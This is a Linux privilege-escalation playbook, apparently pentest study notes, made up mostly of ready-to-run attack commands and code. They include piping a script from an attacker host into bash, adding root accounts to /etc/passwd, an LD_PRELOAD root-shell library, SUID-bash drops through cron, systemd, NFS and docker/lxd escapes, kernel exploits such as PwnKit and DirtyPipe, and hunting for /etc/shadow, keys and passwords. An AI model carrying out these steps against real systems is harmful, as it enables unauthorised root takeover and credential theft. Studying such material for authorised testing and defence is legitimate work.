# 06 — Linux Privilege Escalation

A surface area map and exploitation playbook for going from a low-priv shell to root on Linux. Always combine *automated enum* and *manual deep-dive*. Automation finds the obvious; the manual eye finds the rest.

---

## 1. First Five Commands After Foothold

```bash
id
sudo -l
hostname; uname -a; cat /etc/os-release
ls -la ~ ; pwd
ss -tulnp 2>/dev/null || netstat -tulnp
```

These five answer:
- Who am I? What groups?
- What can I sudo?
- What kernel/distro?
- What's in my home?
- What internal services are listening?

That's 70% of the fast wins.

---

## 2. Automated Enumeration

### 2.1 LinPEAS
The default. Massive coverage. Run it first.
```bash
# attacker:
python3 -m http.server 80
# target:
curl http://<atk>/linpeas.sh | bash | tee /tmp/lp.out
# or
wget http://<atk>/linpeas.sh -O /tmp/lp.sh && chmod +x /tmp/lp.sh && /tmp/lp.sh -a > /tmp/lp.out
```
Skim red/yellow highlights. Anything `99%` or `95%` confidence is the priority.

### 2.2 Linux Smart Enumeration (lse.sh)
Lighter than LinPEAS, runs in tiers.
```bash
./lse.sh -l 2
```

### 2.3 Linux Exploit Suggester (les.sh)
Maps kernel/distro versions to known kernel exploits. Not always reliable, but a useful sanity check.
```bash
./linux-exploit-suggester.sh
```

### 2.4 pspy — process spy
See processes spawned in real time, including ones started by other users (cron, services). Invaluable.
```bash
./pspy64                   # static binary; just run
```
Look for cron jobs running scripts you can write to or whose PATH you can poison.

---

## 3. Manual Enumeration Checklist

```bash
# Identity
id; whoami; groups
sudo -ln 2>/dev/null

# System
hostname
uname -a
cat /etc/os-release
arch
cat /proc/version

# Users
cat /etc/passwd
cat /etc/passwd | grep -v 'nologin\|false'        # only login-capable users
cat /etc/group
cat /etc/shadow 2>/dev/null                       # if readable, hashes!
ls -la /home/

# Sudo
sudo -l                                           # may prompt for password
cat /etc/sudoers 2>/dev/null
ls -la /etc/sudoers.d/ 2>/dev/null

# SUID / SGID
find / -perm -4000 -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
# capabilities
getcap -r / 2>/dev/null

# Cron
ls -la /etc/cron*
cat /etc/crontab
ls -la /var/spool/cron/ /var/spool/cron/crontabs/ 2>/dev/null
crontab -l
# user-set jobs:
ls -la /var/spool/cron/crontabs/
# scripts called by cron:
grep -r 'CRON\|cron' /etc/ 2>/dev/null

# Processes & services
ps auxf
ps -ef --forest
systemctl list-units --type=service --state=running

# Network
ss -tulnp 2>/dev/null
netstat -tulnp 2>/dev/null
ip addr; ip route
cat /etc/hosts
arp -a 2>/dev/null

# Mounts
mount
cat /etc/fstab
df -h

# Files of interest
ls -la / /opt /home /root /var/www /var/log /tmp
find / -name '*.bak' -o -name '*.old' -o -name '*.orig' 2>/dev/null
find / -name 'id_rsa*' 2>/dev/null
find / -name 'authorized_keys' 2>/dev/null
find / -name '*.kdbx' -o -name '*.kdb' 2>/dev/null     # KeePass

# Recent edits (often clue to running cron / process)
find / -newer /etc/passwd ! -path '/proc/*' ! -path '/sys/*' 2>/dev/null
find / -mmin -10 ! -path '/proc/*' ! -path '/sys/*' 2>/dev/null

# Bash history
cat ~/.bash_history
for u in $(cat /etc/passwd | cut -d: -f1); do cat /home/$u/.bash_history 2>/dev/null; done

# SSH
ls -la /etc/ssh/
cat /etc/ssh/sshd_config 2>/dev/null
ls -la ~/.ssh/ /home/*/.ssh/ /root/.ssh/ 2>/dev/null

# Web roots (creds reuse)
ls -la /var/www/ /srv/ /opt/ 2>/dev/null
grep -riE 'pass|password|secret|token|api[-_]?key' /var/www/ 2>/dev/null | head -50
grep -riE 'pass|password|secret' /etc/ 2>/dev/null | head -50

# Environment
env
cat /proc/self/environ
```

---

## 4. Sudo Misconfigurations

### 4.1 `sudo -l` interpretation
Output like:
```
User foo may run the following commands on host:
    (root) NOPASSWD: /usr/bin/find
```
Means: as root, no password, with `/usr/bin/find`. Open https://gtfobins.github.io/gtfobins/find/ → it tells you exactly how to escalate.

### 4.2 GTFOBins workflow
**Always**:
1. Check the binary on https://gtfobins.github.io/.
2. Look under "Sudo" section first.
3. If "Sudo" not listed but "Shell" is, the binary itself spawns a shell — combine with sudo.
4. Test the technique. If it doesn't work, the version may be too new (some bugs are patched).

### 4.3 Common GTFOBins wins (sudo)
```
find . -exec /bin/sh \; -quit
vim -c ':!/bin/sh'
less /etc/profile     # then :!/bin/sh
awk 'BEGIN {system("/bin/sh")}'
nmap --interactive    # legacy nmap
nmap --script=./pwn.nse                # write Lua that runs os.execute('/bin/sh')
perl -e 'exec "/bin/sh";'
python -c 'import pty;pty.spawn("/bin/sh")'
ruby -e 'exec "/bin/sh"'
gdb -nx -ex '!sh' -ex quit
```

### 4.4 Wildcard injection in sudo
If sudo runs e.g. `tar -czf /backup/$ARCHIVE.tgz *` in a directory you can write:
```bash
cd /writable
echo 'echo root::0:0::/root:/bin/bash >> /etc/passwd' > sh
chmod +x sh
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh sh'
# wait for cron / sudo run
```

### 4.5 LD_PRELOAD / LD_LIBRARY_PATH
If `Defaults env_keep+=LD_PRELOAD`:
```c
// pwn.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
void _init() { unsetenv("LD_PRELOAD"); setresuid(0,0,0); system("/bin/bash -p"); }
```
```bash
gcc -fPIC -shared -nostartfiles -o pwn.so pwn.c
sudo LD_PRELOAD=/tmp/pwn.so <allowed-binary>
```
`LD_LIBRARY_PATH` works similarly when a sudo'd binary loads a library you can write.

### 4.6 sudo CVE-2019-14287 (`-1` UID)
Old sudo with `Defaults runas_default=anyone`:
```
sudo -u#-1 id     # → uid=0
```

### 4.7 sudo CVE-2021-3156 ("Baron Samedit")
Heap overflow in sudoedit; if `sudo -V` shows an unpatched version (≤1.9.5p1), `sudo` may grant root *without sudoers entry*.

---

## 5. SUID / SGID Binaries

### 5.1 Identifying
```bash
find / -perm -4000 -type f -exec ls -la {} \; 2>/dev/null
```
Compare against a known-baseline list to spot non-default. Common defaults: `passwd`, `chsh`, `chfn`, `mount`, `umount`, `ping`, `su`, `sudo`, `pkexec`, `at`, `crontab`, `bwrap`, `newgrp`.

**Anything else** is interesting. Anything in `/home`, `/opt`, `/usr/local` definitely is.

### 5.2 GTFOBins approach
Same as sudo. Look up the binary. SUID section.

Highlights (GTFOBins SUID):
```
/usr/bin/find . -exec /bin/sh -p \; -quit       # bash drops -p, so explicitly: /bin/sh -p
/usr/bin/vim -c ':!/bin/sh -p'
/usr/bin/cp                                      # overwrite /etc/passwd
/usr/bin/python -c 'import os;os.setuid(0);os.system("/bin/sh -p")'
/usr/bin/perl -e 'use POSIX(setuid);POSIX::setuid(0);exec "/bin/sh -p"'
/usr/bin/awk 'BEGIN {system("/bin/sh -p")}'
/usr/bin/bash -p
```

### 5.3 Custom SUID binaries
A binary in `/opt/` that's SUID root and clearly bespoke = read it carefully:
```bash
strings /opt/secret-tool | head -100
ltrace /opt/secret-tool      # libc calls, often reveals system() args
strace -f /opt/secret-tool 2>&1 | head -100
```
Look for:
- `system("ls")` without absolute path → PATH hijack
- Unsanitized argv[1] passed to `system` / `popen` → command injection
- `strcpy` on user input → buffer overflow (rare but still appears)

### 5.4 PATH hijack (SUID + relative call)
If `/opt/sbin` runs `system("ls")`:
```bash
echo '#!/bin/bash' > /tmp/ls
echo '/bin/bash -p' >> /tmp/ls
chmod +x /tmp/ls
PATH=/tmp:$PATH /opt/sbin
```

---

## 6. Linux Capabilities

```bash
getcap -r / 2>/dev/null
```
Dangerous capabilities:
- `cap_setuid+ep` on python/perl/ruby/php/gdb → instant root
```bash
/usr/bin/python -c 'import os;os.setuid(0);os.system("/bin/sh")'
```
- `cap_dac_read_search+ep` → read any file (incl. /etc/shadow)
- `cap_sys_ptrace+ep` → attach to root processes
- `cap_chown+ep` → chown root files
- `cap_net_admin+ep` → manipulate network, sniff
- `cap_dac_override+ep` → write any file (sometimes exploitable to /etc/passwd)

GTFOBins also has a "Capabilities" tab per binary.

---

## 7. Cron Jobs

### 7.1 Find them
```bash
ls -la /etc/cron*
cat /etc/crontab
ls -la /etc/cron.d/ /etc/cron.daily/ /etc/cron.hourly/ /etc/cron.weekly/ /etc/cron.monthly/
ls -la /var/spool/cron/crontabs/
```
Combined with `pspy64`, you'll see what cron actually runs.

### 7.2 Vectors
- **Writable script run by root cron** → put a reverse shell in it
- **Writable PATH dir + cron uses relative cmd** → drop a `tar` / `ls` / etc. of your own
- **Wildcard in cron** (`* * * * * root /bin/tar -cf /backup/files.tar /home/user/*`) → see §4.4
- **Cron with predictable filename** (`/tmp/clean.sh` recreated every minute) → race or symlink

### 7.3 Quick exploit pattern
```bash
echo '#!/bin/bash' > /writable/script.sh
echo 'cp /bin/bash /tmp/rb; chmod 4755 /tmp/rb' >> /writable/script.sh
chmod +x /writable/script.sh
# wait for cron tick
ls -la /tmp/rb
/tmp/rb -p              # SUID-root bash
```

---

## 8. Writable Files of High Impact

```bash
ls -la /etc/passwd /etc/shadow /etc/sudoers /etc/cron.d/
find / -writable -type f ! -path '/proc/*' ! -path '/sys/*' 2>/dev/null | head
```

### 8.1 Writable /etc/passwd
```bash
openssl passwd -1 -salt x pwn       # → $1$x$xxxxx
echo 'pwn:$1$x$xxxxx:0:0:root:/root:/bin/bash' >> /etc/passwd
su pwn                              # password: pwn
```

### 8.2 Writable /etc/shadow
```bash
openssl passwd -6 -salt x pwn
# replace root's hash field with the result
```

### 8.3 Writable /etc/sudoers (or /etc/sudoers.d/x)
```
yourname ALL=(ALL) NOPASSWD: ALL
```

### 8.4 Writable cron file → see §7.

### 8.5 Writable service unit
If you can edit a `.service` file in `/etc/systemd/system/` for a unit that root will start:
```ini
[Service]
ExecStart=/bin/bash -c 'cp /bin/bash /tmp/rb; chmod 4755 /tmp/rb'
```

---

## 9. Group Membership Wins

`id` output is gold. Some groups grant easy escalation:

| Group | Vector |
|-------|--------|
| `docker` | `docker run -v /:/mnt --rm -it alpine chroot /mnt sh` |
| `lxd` / `lxc` | Build a privileged container, mount host /, escape. Tons of writeups. |
| `disk` | `debugfs /dev/sda1` → read /etc/shadow |
| `adm` | Read all logs (incl. recent passwords sometimes) |
| `video` | Read framebuffer, sometimes screenshot console |
| `wheel` | On some distros, can sudo |
| `sudo` | Already covered |
| `shadow` | Read /etc/shadow |
| `root` | Edge cases — sometimes auxiliary `root`-group memberships allow read of root-only files |

### 9.1 Docker group → root
```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
# now sh is running as root on the host filesystem
```

### 9.2 LXD/LXC group → root
```bash
# attacker:
git clone https://github.com/saghul/lxd-alpine-builder
cd lxd-alpine-builder && ./build-alpine
# transfer the resulting tarball to target
# target:
lxc image import alpine.tar.gz --alias myimage
lxc init myimage privesc -c security.privileged=true
lxc config device add privesc host disk source=/ path=/mnt/root recursive=true
lxc start privesc
lxc exec privesc /bin/sh
# now in shell:
chroot /mnt/root /bin/bash
```

---

## 10. NFS Misconfiguration (`no_root_squash`)

```bash
showmount -e <ip>
```
Look for an export with `no_root_squash`. Mount on attacker (as root):
```bash
mkdir /mnt/n && mount -t nfs <ip>:/share /mnt/n -o nolock
# drop a SUID-root shell
cp /bin/bash /mnt/n/.bash
chmod 4755 /mnt/n/.bash
# back on target:
ls -la /share/.bash    # SUID, owner root
/share/.bash -p
```

---

## 11. Kernel & Userland Privesc CVEs

Always last resort (noisy, can crash). Verify kernel & glibc versions first:
```bash
uname -r
ldd --version | head -1
```

### 11.1 Pwnkit — `CVE-2021-4034`
`pkexec` with empty argv. Affects polkit ≤ 0.105 (pre-Jan 2022 patch). Works on a stunning fraction of older Linux boxes.
```bash
# https://github.com/berdav/CVE-2021-4034
gcc cve-2021-4034-poc.c -o pwn
./pwn
```

### 11.2 DirtyPipe — `CVE-2022-0847`
Linux kernel 5.8 – 5.16.10. Overwrite read-only files (e.g., /etc/passwd).
```bash
# https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit
./exploit /etc/passwd 1 'pwn::0:0::/root:/bin/bash\n'
```

### 11.3 DirtyCow — `CVE-2016-5195`
Older (pre-2018 kernels). Multiple weaponizations (overwrite SUID, /etc/passwd).

### 11.4 OverlayFS — `CVE-2021-3493`
Ubuntu-specific. Quick local root.

### 11.5 nftables (`CVE-2022-32250`), `CVE-2023-0386`
Modern kernel bugs. Search current year + "linux local privesc CVE."

### 11.6 sudo CVE-2023-22809 ("env_editor")
Editor argument injection in sudoedit.

Always read the PoC before running. Backdoored "kernel exploits" exist on GitHub.

---

## 12. Service-Specific Privesc

### 12.1 MySQL UDF
With root MySQL (creds in a config?) and write to `/usr/lib/mysql/plugin/`, you can load `lib_mysqludf_sys` and run `sys_exec()` as the mysql user (sometimes root via setuid).

### 12.2 Postgres `COPY ... PROGRAM`
With superuser DB privs:
```sql
DROP TABLE IF EXISTS pwn; CREATE TABLE pwn(t TEXT);
COPY pwn FROM PROGRAM 'id';
SELECT * FROM pwn;
```

### 12.3 Apache / Nginx config writable
Drop a virtual host or `.conf` that runs CGI as a higher user.

### 12.4 systemd timer hijack (newer cron)
```bash
systemctl list-timers --all
```
Same as cron-style abuse.

### 12.5 Snap / pkg manager
Some `snap` and `dpkg` configurations allow privileged hooks during install.

---

## 13. Credential Hunting

The frequent winner is "root password sitting in a config in /var/www."

```bash
grep -riE "passwd|password|secret|api[-_]?key|token" /var/www/ /opt/ /home/ /etc/ 2>/dev/null | head -100
grep -r "BEGIN.*PRIVATE KEY" / 2>/dev/null
# Web framework configs
find / -name 'wp-config.php' -o -name '.env' -o -name 'database.yml' \
       -o -name 'settings.py' -o -name 'application.properties' \
       -o -name 'web.config' 2>/dev/null
```
Once you find creds, **reuse**:
- `su <user>` (try every user in `/etc/passwd`)
- `ssh <user>@<localhost>` (if SSH allows)
- DB logins
- WinRM if you pivot to a Windows host

---

## 14. Process Inspection for Secrets

```bash
ps auxf
# sometimes args contain creds:
ps -ef | grep -i 'pass\|secret'
# /proc/<pid>/cmdline
for p in /proc/*/cmdline; do echo "=== $p"; tr '\0' ' ' < $p; echo; done | grep -iE 'pass|secret' -A1
```

Memory dumps (when allowed):
```bash
gcore <pid>
strings core.<pid> | grep -iE 'pass|secret'
```

---

## 15. Practical Privesc Decision Tree

1. `id` — am I in a privileged group? → §9
2. `sudo -l` — sudo entries? → §4
3. `find / -perm -4000` — interesting SUID? → §5
4. `getcap -r /` — capabilities? → §6
5. `ls -la /etc/cron*` + `pspy` — cron jobs? → §7
6. `find / -writable` against high-impact files → §8
7. `showmount -e <self>` — NFS no_root_squash? → §10
8. Service-specific (DB, web app configs, internal services) → §12
9. Credential hunt — reuse for `su` / SSH / DB → §13
10. Kernel / glibc CVEs as last resort → §11

If you've worked through 1–9 with full enumeration and nothing worked, you're missing context. Re-read user `bash_history`, `.viminfo`, mail (`/var/mail/<user>`), home directory dotfiles, /tmp.

---

## 16. Common Anti-Patterns

- Running LinPEAS, scrolling once, declaring "nothing here." LinPEAS output is dense — read it.
- Looking for kernel exploits before checking `sudo -l`.
- Trusting GTFOBins entries blindly without testing the actual binary version.
- Forgetting `bash -p` (preserves effective UID for SUID-root bash).
- Forgetting to unset `LD_PRELOAD` after exploiting it (some commands get confused).
- Not snapshotting / saving creds & hashes you find. You will lose your shell at some point.

---

*Linux privesc is a search problem. The ground is huge but the bug is one entry away.*
